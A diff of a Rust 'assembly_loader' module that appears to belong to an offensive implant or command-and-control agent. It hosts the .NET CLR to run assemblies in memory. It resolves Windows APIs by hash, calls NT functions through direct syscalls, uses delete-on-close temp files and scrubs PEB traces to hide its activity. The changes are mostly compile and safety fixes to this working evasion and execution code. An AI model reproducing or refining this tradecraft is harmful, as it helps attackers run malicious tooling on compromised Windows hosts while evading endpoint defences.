@@ -138,7 +138,7 @@ type FnCloseHandle = unsafe extern "system" fn(HANDLE) -> i32;
 unsafe fn resolve_api<T>(dll_hash: u32, fn_hash: u32) -> Option<T> {
     let dll_base = pe_resolve::get_module_handle_by_hash(dll_hash)?;
     let fn_addr = pe_resolve::get_proc_address_by_hash(dll_base, fn_hash)?;
-    Some(std::mem::transmute::<_, T>(fn_addr))
+    Some(std::mem::transmute_copy(&fn_addr))
 }
 
 // ── COM GUID helper ──────────────────────────────────────────────────────────
@@ -410,15 +410,9 @@ union VARIANTData {
     _record: [u64; 2],
 }
 
-impl Copy for VARIANTData {}
-impl Clone for VARIANTData {
-    fn clone(&self) -> Self {
-        *self
-    }
-}
-
 /// OLE Automation VARIANT — 24 bytes on x64 (8-byte header + 16-byte union).
 #[repr(C)]
+#[derive(Copy, Clone)]
 struct VARIANT {
     vt: u16,
     w_reserved1: u16,
@@ -676,9 +670,7 @@ unsafe fn safe_array_from_bytes(data: &[u8]) -> Result<*mut c_void, String> {
     let mut pv: *mut c_void = std::ptr::null_mut();
     let hr = access_data(sa, &mut pv);
     if hr != S_OK || pv.is_null() {
-        let destroy: FnSafeArrayDestroy = resolve_oleaut32_fn(b"SafeArrayDestroy\0")
-            .unwrap_or(std::mem::transmute(std::ptr::null::<()>()));
-        if !destroy as bool {
+        if let Some(destroy) = resolve_oleaut32_fn::<FnSafeArrayDestroy>(b"SafeArrayDestroy\0") {
             destroy(sa);
         }
         return Err(format!("SafeArrayAccessData failed: hr={:#010X}", hr as u32));
@@ -704,9 +696,7 @@ unsafe fn safe_array_from_variants(variants: &[VARIANT]) -> Result<*mut c_void, 
     let mut pv: *mut c_void = std::ptr::null_mut();
     let hr = access_data(sa, &mut pv);
     if hr != S_OK || pv.is_null() {
-        let destroy: FnSafeArrayDestroy = resolve_oleaut32_fn(b"SafeArrayDestroy\0")
-            .unwrap_or(std::mem::transmute(std::ptr::null::<()>()));
-        if !destroy as bool {
+        if let Some(destroy) = resolve_oleaut32_fn::<FnSafeArrayDestroy>(b"SafeArrayDestroy\0") {
             destroy(sa);
         }
         return Err(format!("SafeArrayAccessData failed: hr={:#010X}", hr as u32));
@@ -737,7 +727,7 @@ unsafe fn dispatch_get_id(
     let disp = &*dispatch;
     let name_ptr: LPCWSTR = name.as_ptr();
     let mut dispid: i32 = 0;
-    let hr = (disp.vtable.get_ids_of_names)(
+    let hr = ((*disp.vtable).get_ids_of_names)(
         dispatch as *mut c_void,
         IID_NULL.as_ptr(),
         &name_ptr,
@@ -768,7 +758,7 @@ unsafe fn dispatch_invoke(
     let mut excep_info = std::mem::zeroed::<EXCEPINFO>();
     let mut arg_err: u32 = 0;
 
-    let hr = (disp.vtable.invoke)(
+    let hr = ((*disp.vtable).invoke)(
         dispatch as *mut c_void,
         dispid,
         IID_NULL.as_ptr(),
@@ -878,14 +868,14 @@ unsafe fn init_clr_host() -> Result<(*mut ICLRRuntimeHost, *mut ICorRuntimeHost)
         data4: [0xC0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x46],
     };
     let mut enum_ptr: LPVOID = std::ptr::null_mut();
-    let hr = (meta_host.vtable.enumerate_installed_runtimes)(
+    let hr = ((*meta_host.vtable).enumerate_installed_runtimes)(
         meta_host_ptr,
         iid_enum.as_ptr(),
         &mut enum_ptr,
     );
     if hr != S_OK || enum_ptr.is_null() {
         // Release meta_host
-        (meta_host.vtable.release)(meta_host_ptr);
+        ((*meta_host.vtable).release)(meta_host_ptr);
         return Err(format!(
             "EnumerateInstalledRuntimes failed: hr={:#010X}",
             hr as u32
@@ -899,7 +889,7 @@ unsafe fn init_clr_host() -> Result<(*mut ICLRRuntimeHost, *mut ICorRuntimeHost)
     loop {
         let mut fetched: ULONG = 0;
         let mut item: LPVOID = std::ptr::null_mut();
-        let hr = (enumerator.vtable.next)(enum_ptr, 1, &mut item, &mut fetched);
+        let hr = ((*enumerator.vtable).next)(enum_ptr, 1, &mut item, &mut fetched);
         if hr != S_OK || fetched == 0 {
             break;
         }
@@ -909,7 +899,7 @@ unsafe fn init_clr_host() -> Result<(*mut ICLRRuntimeHost, *mut ICorRuntimeHost)
         // Get version string.
         let mut buf_len: DWORD = 128;
         let mut version_buf = vec![0u16; buf_len as usize];
-        let hr = (runtime_info.vtable.get_version_string)(
+        let hr = ((*runtime_info.vtable).get_version_string)(
             item,
             version_buf.as_mut_ptr(),
             &mut buf_len,
@@ -918,14 +908,14 @@ unsafe fn init_clr_host() -> Result<(*mut ICLRRuntimeHost, *mut ICorRuntimeHost)
         if hr != S_OK {
             // Try again with returned length.
             version_buf = vec![0u16; buf_len as usize];
-            let hr2 = (runtime_info.vtable.get_version_string)(
+            let hr2 = ((*runtime_info.vtable).get_version_string)(
                 item,
                 version_buf.as_mut_ptr(),
                 &mut buf_len,
                 std::ptr::null_mut(),
             );
             if hr2 != S_OK {
-                (runtime_info.vtable.release)(item);
+                ((*runtime_info.vtable).release)(item);
                 continue;
             }
         }
@@ -957,17 +947,17 @@ unsafe fn init_clr_host() -> Result<(*mut ICLRRuntimeHost, *mut ICorRuntimeHost)
             best_runtime = Some((item as *mut ICLRRuntimeInfo, version_buf.clone()));
         } else {
             // Release this runtime info.
-            (runtime_info.vtable.release)(item);
+            ((*runtime_info.vtable).release)(item);
         }
     }
 
     // Release enumerator.
-    (enumerator.vtable.release)(enum_ptr);
+    ((*enumerator.vtable).release)(enum_ptr);
 
     let (runtime_info_ptr, _ver_buf) = match best_runtime {
         Some(r) => r,
         None => {
-            (meta_host.vtable.release)(meta_host_ptr);
+            ((*meta_host.vtable).release)(meta_host_ptr);
             return Err("no .NET Framework v4.x runtime found".to_string());
         }
     };
@@ -979,7 +969,7 @@ unsafe fn init_clr_host() -> Result<(*mut ICLRRuntimeHost, *mut ICorRuntimeHost)
 
     // ── Get ICLRRuntimeHost ─────────────────────────────────────────────
     let mut runtime_host_ptr: LPVOID = std::ptr::null_mut();
-    let hr = (runtime_info.vtable.get_interface)(
+    let hr = ((*runtime_info.vtable).get_interface)(
         runtime_info_ptr as *mut c_void,
         CLSID_CLR_RUNTIME_HOST.as_clsid_ptr(),
         IID_ICLR_RUNTIME_HOST.as_ptr(),
@@ -987,9 +977,9 @@ unsafe fn init_clr_host() -> Result<(*mut ICLRRuntimeHost, *mut ICorRuntimeHost)
     );
 
     // Release the runtime info now that we have the host.
-    (runtime_info.vtable.release)(runtime_info_ptr as *mut c_void);
+    ((*runtime_info.vtable).release)(runtime_info_ptr as *mut c_void);
     // Release meta_host.
-    (meta_host.vtable.release)(meta_host_ptr);
+    ((*meta_host.vtable).release)(meta_host_ptr);
 
     if hr != S_OK || runtime_host_ptr.is_null() {
         return Err(format!(
@@ -1001,9 +991,9 @@ unsafe fn init_clr_host() -> Result<(*mut ICLRRuntimeHost, *mut ICorRuntimeHost)
     let runtime_host = &*(runtime_host_ptr as *const ICLRRuntimeHost);
 
     // ── Start the CLR ───────────────────────────────────────────────────
-    let hr = (runtime_host.vtable.start)(runtime_host_ptr);
+    let hr = ((*runtime_host.vtable).start)(runtime_host_ptr);
     if hr != S_OK {
-        (runtime_host.vtable.release)(runtime_host_ptr);
+        ((*runtime_host.vtable).release)(runtime_host_ptr);
         return Err(format!("ICLRRuntimeHost::Start() failed: hr={:#010X}", hr as u32));
     }
 
@@ -1037,7 +1027,7 @@ unsafe fn init_clr_host() -> Result<(*mut ICLRRuntimeHost, *mut ICorRuntimeHost)
             data4: [0xC0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x46],
         };
         let mut enum_ptr2: LPVOID = std::ptr::null_mut();
-        let hr3 = (meta_host2.vtable.enumerate_installed_runtimes)(
+        let hr3 = ((*meta_host2.vtable).enumerate_installed_runtimes)(
             meta_host_ptr2,
             iid_enum2.as_ptr(),
             &mut enum_ptr2,
@@ -1050,14 +1040,14 @@ unsafe fn init_clr_host() -> Result<(*mut ICLRRuntimeHost, *mut ICorRuntimeHost)
             loop {
                 let mut fetched: ULONG = 0;
                 let mut item: LPVOID = std::ptr::null_mut();
-                let hr = (enumerator2.vtable.next)(enum_ptr2, 1, &mut item, &mut fetched);
+                let hr = ((*enumerator2.vtable).next)(enum_ptr2, 1, &mut item, &mut fetched);
                 if hr != S_OK || fetched == 0 {
                     break;
                 }
                 let ri = &*(item as *const ICLRRuntimeInfo);
                 let mut blen: DWORD = 128;
                 let mut vbuf = vec![0u16; blen as usize];
-                let hr = (ri.vtable.get_version_string)(
+                let hr = ((*ri.vtable).get_version_string)(
                     item,
                     vbuf.as_mut_ptr(),
                     &mut blen,
@@ -1065,7 +1055,7 @@ unsafe fn init_clr_host() -> Result<(*mut ICLRRuntimeHost, *mut ICorRuntimeHost)
                 );
                 if hr != S_OK {
                     vbuf = vec![0u16; blen as usize];
-                    let _ = (ri.vtable.get_version_string)(
+                    let _ = ((*ri.vtable).get_version_string)(
                         item,
                         vbuf.as_mut_ptr(),
                         &mut blen,
@@ -1084,17 +1074,17 @@ unsafe fn init_clr_host() -> Result<(*mut ICLRRuntimeHost, *mut ICorRuntimeHost)
                     best_ver2 = nv;
                     if let Some(old) = best_rt2.take() {
                         let old_ri = &*(old as *const ICLRRuntimeInfo);
-                        (old_ri.vtable.release)(old);
+                        ((*old_ri.vtable).release)(old);
                     }
                     best_rt2 = Some(item);
                 } else {
-                    (ri.vtable.release)(item);
+                    ((*ri.vtable).release)(item);
                 }
             }
-            (enumerator2.vtable.release)(enum_ptr2);
+            ((*enumerator2.vtable).release)(enum_ptr2);
             if let Some(rt2) = best_rt2 {
                 let ri2 = &*(rt2 as *const ICLRRuntimeInfo);
-                let hr = (ri2.vtable.get_interface)(
+                let hr = ((*ri2.vtable).get_interface)(
                     rt2,
                     CLSID_COR_RUNTIME_HOST.as_clsid_ptr(),
                     IID_ICOR_RUNTIME_HOST.as_ptr(),
@@ -1109,11 +1099,11 @@ unsafe fn init_clr_host() -> Result<(*mut ICLRRuntimeHost, *mut ICorRuntimeHost)
                     );
                     cor_host_ptr = std::ptr::null_mut();
                 }
-                (ri2.vtable.release)(rt2);
+                ((*ri2.vtable).release)(rt2);
             }
         }
         let mh2 = &*(meta_host_ptr2 as *const ICLRMetaHost);
-        (mh2.vtable.release)(meta_host_ptr2);
+        ((*mh2.vtable).release)(meta_host_ptr2);
     }
 
     Ok((runtime_host_ptr as *mut ICLRRuntimeHost, cor_host_ptr as *mut ICorRuntimeHost))
@@ -1140,14 +1130,14 @@ fn parse_version_to_u32(s: &str) -> u32 {
 unsafe fn teardown_clr_host(state: &mut ClrHostState) {
     if !state.runtime_host.is_null() {
         let host = &*state.runtime_host;
-        (host.vtable.stop)(state.runtime_host as *mut c_void);
-        (host.vtable.release)(state.runtime_host as *mut c_void);
+        ((*host.vtable).stop)(state.runtime_host as *mut c_void);
+        ((*host.vtable).release)(state.runtime_host as *mut c_void);
         state.runtime_host = std::ptr::null_mut();
         log::info!("[assembly_loader] CLR host stopped and released");
     }
     if !state.cor_host.is_null() {
         let cor = &*state.cor_host;
-        (cor.vtable.release)(state.cor_host as *mut c_void);
+        ((*cor.vtable).release)(state.cor_host as *mut c_void);
         state.cor_host = std::ptr::null_mut();
         log::info!("[assembly_loader] ICorRuntimeHost released");
     }
@@ -1575,7 +1565,7 @@ unsafe fn execute_in_memory_internal(
 
     // ── 1. Get default AppDomain ────────────────────────────────────────
     let mut appdomain_ptr: *mut c_void = std::ptr::null_mut();
-    let hr = (host.vtable.get_default_domain)(
+    let hr = ((*host.vtable).get_default_domain)(
         cor_host as *mut c_void,
         &mut appdomain_ptr,
     );
@@ -1590,7 +1580,7 @@ unsafe fn execute_in_memory_internal(
     // ── 2. QI AppDomain for IDispatch ───────────────────────────────────
     let appdomain_dispatch = &*(appdomain_ptr as *const IDispatch);
     let mut dispatch_ptr: LPVOID = std::ptr::null_mut();
-    let hr = (appdomain_dispatch.vtable.query_interface)(
+    let hr = ((*appdomain_dispatch.vtable).query_interface)(
         appdomain_ptr,
         IID_IDISPATCH.as_ptr(),
         &mut dispatch_ptr,
@@ -1598,7 +1588,7 @@ unsafe fn execute_in_memory_internal(
     if hr != S_OK || dispatch_ptr.is_null() {
         // Release the appdomain IUnknown.
         let unk = &*(appdomain_ptr as *const ICLRRuntimeHost); // reuse QI/AddRef/Release layout
-        (unk.vtable.release)(appdomain_ptr);
+        ((*unk.vtable).release)(appdomain_ptr);
         return Err(format!(
             "AppDomain QI for IDispatch failed: hr={:#010X}",
             hr as u32
@@ -1621,7 +1611,7 @@ unsafe fn execute_in_memory_internal(
         c_named_args: 0,
     };
 
-    let assembly_result = dispatch_invoke(appdomain, dispid_load, DISPATCH_METHOD, &mut load_params)?;
+    let mut assembly_result = dispatch_invoke(appdomain, dispid_load, DISPATCH_METHOD, &mut load_params)?;
     variant_clear(&mut load_arg);
     safe_array_destroy(sa_bytes);
 
@@ -1630,10 +1620,10 @@ unsafe fn execute_in_memory_internal(
         variant_clear(&mut assembly_result);
         // Release appdomain IDispatch.
         let disp = &*appdomain;
-        (disp.vtable.release)(appdomain as *mut c_void);
+        ((*disp.vtable).release)(appdomain as *mut c_void);
         // Release appdomain IUnknown.
         let unk = &*(appdomain_ptr as *const ICLRRuntimeHost);
-        (unk.vtable.release)(appdomain_ptr);
+        ((*unk.vtable).release)(appdomain_ptr);
         return Err(format!(
             "AppDomain.Load_3 returned unexpected VT: {:#06X} (expected VT_DISPATCH)",
             vt
@@ -1655,16 +1645,16 @@ unsafe fn execute_in_memory_internal(
         c_named_args: 0,
     };
 
-    let ep_result = dispatch_invoke(assembly_disp, dispid_ep, DISPATCH_PROPERTYGET, &mut ep_params)?;
+    let mut ep_result = dispatch_invoke(assembly_disp, dispid_ep, DISPATCH_PROPERTYGET, &mut ep_params)?;
 
     if ep_result.vt != VT_DISPATCH && ep_result.vt != VT_UNKNOWN {
         let vt = ep_result.vt;
         variant_clear(&mut ep_result);
         variant_clear(&mut assembly_result);
         let disp = &*appdomain;
-        (disp.vtable.release)(appdomain as *mut c_void);
+        ((*disp.vtable).release)(appdomain as *mut c_void);
         let unk = &*(appdomain_ptr as *const ICLRRuntimeHost);
-        (unk.vtable.release)(appdomain_ptr);
+        ((*unk.vtable).release)(appdomain_ptr);
         return Err(format!(
             "Assembly.EntryPoint returned unexpected VT: {:#06X}",
             vt
@@ -1723,12 +1713,14 @@ unsafe fn execute_in_memory_internal(
         return Err("CreatePipe(stdout) failed".to_string());
     }
     if create_pipe(&mut stderr_read, &mut stderr_write, &mut sa, 0) == 0 {
-        let close: FnCloseHandle = resolve_api(
+        let close = resolve_api::<FnCloseHandle>(
             pe_resolve::HASH_KERNEL32_DLL,
             pe_resolve::hash_str(b"CloseHandle\0"),
-        ).unwrap_or(std::mem::transmute(std::ptr::null::<()>()));
-        if !close as bool { close(stdout_read); }
-        if !close as bool { close(stdout_write); }
+        );
+        if let Some(close) = close {
+            close(stdout_read);
+            close(stdout_write);
+        }
         return Err("CreatePipe(stderr) failed".to_string());
     }
 
@@ -1788,8 +1780,12 @@ unsafe fn execute_in_memory_internal(
 
     let orig_stdout = get_std_handle(STD_OUTPUT_HANDLE);
     let orig_stderr = get_std_handle(STD_ERROR_HANDLE);
+    let orig_stdout_raw = orig_stdout as usize;
+    let orig_stderr_raw = orig_stderr as usize;
 
-    let thread_result = std::thread::spawn(move || -> Result<VARIANT, String> {
+    let thread_result = std::thread::spawn(move || -> Result<(), String> {
+        let mut ctx = ctx;
+
         // Redirect stdout/stderr to our pipes (on this thread).
         set_std_handle(STD_OUTPUT_HANDLE, ctx.stdout_write);
         set_std_handle(STD_ERROR_HANDLE, ctx.stderr_write);
@@ -1806,7 +1802,7 @@ unsafe fn execute_in_memory_internal(
             c_named_args: 0,
         };
 
-        let hr = (method.vtable.invoke)(
+        let hr = ((*method.vtable).invoke)(
             ctx.method_disp as *mut c_void,
             ctx.dispid_invoke,
             IID_NULL.as_ptr(),
@@ -1819,8 +1815,8 @@ unsafe fn execute_in_memory_internal(
         );
 
         // Restore original handles before returning.
-        set_std_handle(STD_OUTPUT_HANDLE, orig_stdout);
-        set_std_handle(STD_ERROR_HANDLE, orig_stderr);
+        set_std_handle(STD_OUTPUT_HANDLE, orig_stdout_raw as HANDLE);
+        set_std_handle(STD_ERROR_HANDLE, orig_stderr_raw as HANDLE);
 
         if hr != S_OK {
             let mut desc = format!("hr={:#010X}", hr as u32);
@@ -1839,7 +1835,8 @@ unsafe fn execute_in_memory_internal(
             }
             Err(format!("MethodInfo.Invoke_2 failed: {}", desc))
         } else {
-            Ok(result)
+            variant_clear(&mut result);
+            Ok(())
         }
     });
 
@@ -1851,12 +1848,11 @@ unsafe fn execute_in_memory_internal(
 
     let timeout_ms = timeout_secs * 1000;
     let mut needs_reinit = false;
-    let mut invoke_result: Option<VARIANT> = None;
 
     // Use NtWaitForSingleObject on the thread handle to enforce timeout.
-    let exec_raw_handle = thread_result.as_raw_handle();
+    let exec_raw_handle = std::os::windows::io::AsRawHandle::as_raw_handle(&thread_result);
     let timeout_100ns: i64 = -((timeout_secs as i64) * 10_000_000i64);
-    let wait_status = syscall!(
+    let wait_status = crate::syscall!(
         "NtWaitForSingleObject",
         exec_raw_handle as u64,
         0u64, // Alertable = FALSE
@@ -1873,9 +1869,7 @@ unsafe fn execute_in_memory_internal(
 
     if thread_completed {
         match thread_result.join() {
-            Ok(Ok(result)) => {
-                invoke_result = Some(result);
-            }
+            Ok(Ok(())) => {}
             Ok(Err(e)) => {
                 log::warn!("[assembly_loader] in-memory invoke failed: {}", e);
             }
@@ -1890,7 +1884,7 @@ unsafe fn execute_in_memory_internal(
             "[assembly_loader] in-memory assembly timed out after {}s — terminating CLR thread",
             timeout_secs
         );
-        let term_status = syscall!("NtTerminateThread", exec_raw_handle as u64, 0u64);
+        let term_status = crate::syscall!("NtTerminateThread", exec_raw_handle as u64, 0u64);
         match term_status {
             Ok(s) if s >= 0 => {
                 log::info!("[assembly_loader] CLR exec thread terminated (status 0x{s:08X})");
@@ -1908,7 +1902,7 @@ unsafe fn execute_in_memory_internal(
         }
         // Drop the JoinHandle without joining — the thread is already dead.
         // NtClose the OS handle since we've already terminated the thread.
-        let _ = syscall!("NtClose", exec_raw_handle as u64);
+        let _ = crate::syscall!("NtClose", exec_raw_handle as u64);
         std::mem::forget(thread_result);
         needs_reinit = true;
     }
@@ -1927,10 +1921,6 @@ unsafe fn execute_in_memory_internal(
     let output = String::from_utf8_lossy(&output_buf).to_string();
 
     // ── 10. Cleanup ─────────────────────────────────────────────────────
-    if let Some(mut result) = invoke_result {
-        variant_clear(&mut result);
-    }
-
     // Free arg BSTRs.
     for bstr in &arg_bstrs {
         sys_free_string(*bstr);
@@ -1942,16 +1932,16 @@ unsafe fn execute_in_memory_internal(
     // Release MethodInfo, Assembly IDispatch.
     if !method_info.is_null() {
         let md = &*(method_info as *const IDispatch);
-        (md.vtable.release)(method_info);
+        ((*md.vtable).release)(method_info);
     }
     variant_clear(&mut ep_result);
     variant_clear(&mut assembly_result);
 
     // Release AppDomain IDispatch + IUnknown.
     let disp = &*appdomain;
-    (disp.vtable.release)(appdomain as *mut c_void);
+    ((*disp.vtable).release)(appdomain as *mut c_void);
     let unk = &*(appdomain_ptr as *const ICLRRuntimeHost);
-    (unk.vtable.release)(appdomain_ptr);
+    ((*unk.vtable).release)(appdomain_ptr);
 
     log::info!("[assembly_loader] in-memory: execution complete, {} bytes output", output.len());
 
@@ -2193,7 +2183,7 @@ pub unsafe fn execute(
     let mut io_status: [u64; 2] = [0; 2];
     let mut h_file: usize = 0;
 
-    let create_status = syscall!(
+    let create_status = crate::syscall!(
         "NtCreateFile",
         &mut h_file as *mut _ as u64,          // FileHandle
         (SYNCHRONIZE | GENERIC_WRITE | GENERIC_READ) as u64, // DesiredAccess
@@ -2218,7 +2208,7 @@ pub unsafe fn execute(
     let mut offset: usize = 0;
     while offset < assembly_bytes.len() {
         let chunk = &assembly_bytes[offset..];
-        let write_status = syscall!(
+        let write_status = crate::syscall!(
             "NtWriteFile",
             h_file as u64,                       // FileHandle
             0u64,                                 // Event
@@ -2231,7 +2221,7 @@ pub unsafe fn execute(
             0u64,                                 // Key
         );
         if write_status.is_err() || write_status.as_ref().map(|s| *s).unwrap_or(-1) < 0 {
-            let _ = syscall!("NtClose", h_file as u64);
+            let _ = crate::syscall!("NtClose", h_file as u64);
             return Err(format!(
                 "NtWriteFile for temp assembly failed at offset {offset}: status {:?}",
                 write_status
@@ -2239,7 +2229,7 @@ pub unsafe fn execute(
         }
         let bytes_written = io_status[0] as u32;
         if bytes_written == 0 {
-            let _ = syscall!("NtClose", h_file as u64);
+            let _ = crate::syscall!("NtClose", h_file as u64);
             return Err("NtWriteFile wrote 0 bytes — disk full?".to_string());
         }
         offset += bytes_written as usize;
@@ -2271,13 +2261,13 @@ pub unsafe fn execute(
     ).ok_or("cannot resolve CreatePipe")?;
 
     if create_pipe(&mut stdout_read, &mut stdout_write, &mut sa, 0) == 0 {
-        let _ = syscall!("NtClose", h_file as u64);
+        let _ = crate::syscall!("NtClose", h_file as u64);
         return Err("CreatePipe(stdout) failed".to_string());
     }
     if create_pipe(&mut stderr_read, &mut stderr_write, &mut sa, 0) == 0 {
-        let _ = syscall!("NtClose", stdout_read as u64);
-        let _ = syscall!("NtClose", stdout_write as u64);
-        let _ = syscall!("NtClose", h_file as u64);
+        let _ = crate::syscall!("NtClose", stdout_read as u64);
+        let _ = crate::syscall!("NtClose", stdout_write as u64);
+        let _ = crate::syscall!("NtClose", h_file as u64);
         return Err("CreatePipe(stderr) failed".to_string());
     }
 
@@ -2312,16 +2302,16 @@ pub unsafe fn execute(
 
     let timeout_event = create_event_w(std::ptr::null_mut(), 1, 0, std::ptr::null_mut());
     if timeout_event.is_null() {
-        let _ = syscall!("NtClose", stdout_read as u64);
-        let _ = syscall!("NtClose", stdout_write as u64);
-        let _ = syscall!("NtClose", stderr_read as u64);
-        let _ = syscall!("NtClose", stderr_write as u64);
-        let _ = syscall!("NtClose", h_file as u64);
+        let _ = crate::syscall!("NtClose", stdout_read as u64);
+        let _ = crate::syscall!("NtClose", stdout_write as u64);
+        let _ = crate::syscall!("NtClose", stderr_read as u64);
+        let _ = crate::syscall!("NtClose", stderr_write as u64);
+        let _ = crate::syscall!("NtClose", h_file as u64);
         return Err("CreateEvent for timeout failed".to_string());
     }
 
     // Spawn the execution on a separate thread so we can enforce timeout.
-    let exec_runtime_host = runtime_host as *mut c_void;
+    let exec_runtime_host = runtime_host as usize;
     let exec_assembly_path = assembly_path.clone();
     let exec_type_name = type_name.clone();
     let exec_method_name = method_name.clone();
@@ -2337,8 +2327,8 @@ pub unsafe fn execute(
         .spawn(move || {
             let mut return_val: DWORD = 0;
             let host = &*(exec_runtime_host as *const ICLRRuntimeHost);
-            let hr = (host.vtable.execute_in_default_app_domain)(
-                exec_runtime_host,
+            let hr = ((*host.vtable).execute_in_default_app_domain)(
+                exec_runtime_host as *mut c_void,
                 exec_assembly_path.as_ptr(),
                 exec_type_name.as_ptr(),
                 exec_method_name.as_ptr(),
@@ -2350,20 +2340,19 @@ pub unsafe fn execute(
         .map_err(|e| format!("spawn exec thread: {e}"))?;
 
     // Wait with timeout.
-    let exec_handle = exec_thread.as_raw_handle();
-    let wait_result = unsafe {
+    let exec_handle = std::os::windows::io::AsRawHandle::as_raw_handle(&exec_thread);
+    let wait_result = {
         // NtWaitForSingleObject with timeout in 100ns units (negative = relative).
         let timeout_100ns: i64 = -((timeout * 1000) as i64 * 10_000_000i64);
-        let status = syscall!(
+        let status = crate::syscall!(
             "NtWaitForSingleObject",
             exec_handle as u64,
             0u64, // Alertable = FALSE
             &timeout_100ns as *const _ as u64,
         );
-        if status.is_err() || status.unwrap() < 0 {
-            0xFFFFFFFFu32 // WAIT_FAILED equivalent
-        } else {
-            status.unwrap() as u32
+        match status {
+            Ok(s) if s >= 0 => s as u32,
+            _ => 0xFFFFFFFFu32, // WAIT_FAILED equivalent
         }
     };
 
@@ -2395,7 +2384,7 @@ pub unsafe fn execute(
         );
 
         // NtTerminateThread(HANDLE ThreadHandle, NTSTATUS ExitStatus)
-        let term_status = syscall!("NtTerminateThread", exec_handle as u64, 0u64);
+        let term_status = crate::syscall!("NtTerminateThread", exec_handle as u64, 0u64);
         match term_status {
             Ok(s) if s >= 0 => {
                 log::info!("[assembly_loader] CLR exec thread terminated (status 0x{s:08X})");
@@ -2413,7 +2402,7 @@ pub unsafe fn execute(
         }
 
         // Close the thread handle now that we've terminated it.
-        let _ = syscall!("NtClose", exec_handle as u64);
+        let _ = crate::syscall!("NtClose", exec_handle as u64);
 
         // Flag CLR host for reinit on next execution.
         if let Ok(mut guard) = CLR_HOST.lock() {
@@ -2427,12 +2416,12 @@ pub unsafe fn execute(
     };
 
     // ── Cleanup ─────────────────────────────────────────────────────────
-    let _ = syscall!("NtClose", stdout_read as u64);
-    let _ = syscall!("NtClose", stdout_write as u64);
-    let _ = syscall!("NtClose", stderr_read as u64);
-    let _ = syscall!("NtClose", stderr_write as u64);
+    let _ = crate::syscall!("NtClose", stdout_read as u64);
+    let _ = crate::syscall!("NtClose", stdout_write as u64);
+    let _ = crate::syscall!("NtClose", stderr_read as u64);
+    let _ = crate::syscall!("NtClose", stderr_write as u64);
     if !timeout_event.is_null() {
-        let _ = syscall!("NtClose", timeout_event as u64);
+        let _ = crate::syscall!("NtClose", timeout_event as u64);
     }
 
     // Drop the exec thread join handle.  On the success path the thread has
@@ -2443,7 +2432,7 @@ pub unsafe fn execute(
 
     // Close the NT file handle.  FILE_DELETE_ON_CLOSE auto-deletes the file
     // now that all handles (ours + CLR's) have been closed.
-    let _ = syscall!("NtClose", h_file as u64);
+    let _ = crate::syscall!("NtClose", h_file as u64);
 
     // Apply memory hygiene.
     crate::memory_hygiene::scrub_peb_traces();
@@ -2461,21 +2450,8 @@ pub unsafe fn execute(
 
 // ── Error codes ──────────────────────────────────────────────────────────────
 
-const E_TIMEOUT: HRESULT = 0x8000_0005; // E_FAIL, repurposed for timeout
-const E_EXECUTION_FAILED: HRESULT = 0x8000_4005; // E_ABORT
-
-// ── Handle wrapper for thread JoinHandle ─────────────────────────────────────
-
-trait AsRawHandle {
-    fn as_raw_handle(&self) -> HANDLE;
-}
-
-impl<T> AsRawHandle for std::thread::JoinHandle<T> {
-    fn as_raw_handle(&self) -> HANDLE {
-        use std::os::windows::io::AsRawHandle;
-        self.as_raw_handle()
-    }
-}
+const E_TIMEOUT: HRESULT = 0x8000_0005u32 as i32; // E_FAIL, repurposed for timeout
+const E_EXECUTION_FAILED: HRESULT = 0x8000_4005u32 as i32; // E_ABORT
 
 // ── Tests ────────────────────────────────────────────────────────────────────
 
@@ -2496,15 +2472,19 @@ mod tests {
     fn input_validation_rejects_oversized_assembly() {
         let big = vec![0u8; MAX_ASSEMBLY_SIZE + 1];
         let result = unsafe { execute(&big, &[], None) };
-        assert!(result.is_err());
-        assert!(result.unwrap_err().contains("too large"));
+        match result {
+            Ok(_) => panic!("expected oversized assembly to be rejected"),
+            Err(e) => assert!(e.contains("too large")),
+        }
     }
 
     #[test]
     fn input_validation_rejects_too_many_args() {
         let args: Vec<String> = (0..MAX_ARGS + 1).map(|i| format!("arg{}", i)).collect();
         let result = unsafe { execute(&[0u8; 100], &args, None) };
-        assert!(result.is_err());
-        assert!(result.unwrap_err().contains("too many arguments"));
+        match result {
+            Ok(_) => panic!("expected too many args to be rejected"),
+            Err(e) => assert!(e.contains("too many arguments")),
+        }
     }
 }
